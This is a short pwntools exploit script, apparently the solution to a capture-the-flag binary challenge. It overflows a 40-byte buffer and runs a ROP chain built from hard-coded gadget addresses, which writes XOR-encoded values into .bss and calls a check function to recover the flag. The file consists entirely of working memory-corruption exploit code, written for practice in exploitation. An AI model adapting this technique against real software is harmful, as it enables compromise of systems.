from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes

r = process('./chal')
# r = remote('10.113.184.121', 10051)
context.arch = 'amd64'

r.recvuntil(b'secret = ')
secret = int(r.recvline().strip().decode(), 16)
log.info(f'secret = {hex(secret)}')

check_fn_addr = 0x4017ba
bss_section = 0x4c7f00
pop_rdx_rbx_ret = 0x0000000000485e8b
mov_qword_ptr_rdi_rdx_ret = 0x00000000004337e3
pop_rdi_ret = 0x00000000004020af

input_1 = u64(b'kyoumoka') ^ secret
input_2 = u64(b'waii\x00\x00\x00\x00') ^ secret
log.info(f'input_1 = {hex(input_1)}, input_2 = {hex(input_2)}')

rop_chain = flat(
    pop_rdi_ret,        bss_section,
    pop_rdx_rbx_ret,    input_1,        0,
    mov_qword_ptr_rdi_rdx_ret,
    pop_rdi_ret,        bss_section + 0x8,
    pop_rdx_rbx_ret,    input_2,        0,
    mov_qword_ptr_rdi_rdx_ret,
    pop_rdi_ret,        bss_section,
    check_fn_addr
)
raw_input()
r.sendlineafter(b'> ', b'a' * 40 + rop_chain)
r.recvuntil(b'flag = ')
output = r.recvline().strip()
tmp = bytes_to_long(b'kyoumokawaii')
log.info(f'output = {output}')
log.info(f'Part 1 = {hex(u64(output[0:8]))}, Part 2 = {hex(u64(output[8:16]))}')
flag_1 = long_to_bytes(u64(output[0:8]) ^ input_1)
flag_2 = long_to_bytes(u64(output[8:16]) ^ input_2)
log.info(f'flag = {flag_1} + {flag_2}')#long_to_bytes(output ^ secret ^ tmp)

r.interactive()